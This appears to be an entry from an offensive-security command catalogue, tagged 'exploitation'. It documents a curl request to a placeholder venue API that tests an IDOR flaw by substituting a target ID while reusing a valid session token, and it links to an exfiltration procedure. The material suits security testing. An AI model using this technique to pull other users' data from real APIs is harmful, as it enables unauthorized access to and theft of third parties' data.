---
id: cmd-uuid-1
data: >-
  curl -X GET "https://veris.example.com/api/venues/{venue_id}" -H
  "Authorization: Bearer {token}" -H "Content-Type: application/json"
tags:
  - api
  - web
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.374Z'
verified: false
validated: true
submitted: true
---
# curl-send-api-request

## Command

```bash
curl -X GET "https://veris.example.com/api/venues/{venue_id}" -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
```

## Description

This command sends a GET request to the Veris venue API endpoint using curl, simulating the modified IDOR request to retrieve venue data. Replace {venue_id} with the target ID and {token} with a valid auth bearer token from a legitimate session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `"https://veris.example.com/api/venues/{venue_id}"` | The API endpoint URL with target venue_id | Yes |
| `-H "Authorization: Bearer {token}"` | Authentication header with session token | Yes |
| `-H "Content-Type: application/json"` | Sets request content type | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://veris.example.com/api/venues/456" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." -H "Content-Type: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://veris.example.com/api/venues/456" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." -H "Content-Type: application/json" -o venue_data.json
```

## Expected Output

Successful execution returns a JSON response with venue details, e.g., {"id":456,"name":"Target Venue","address":"...","config":{...}}. Errors may show 401/403 if auth fails or 404 if ID invalid.

## Related

- [[Related Procedure: Send-Modified-Request-and-Exfil-Data]]
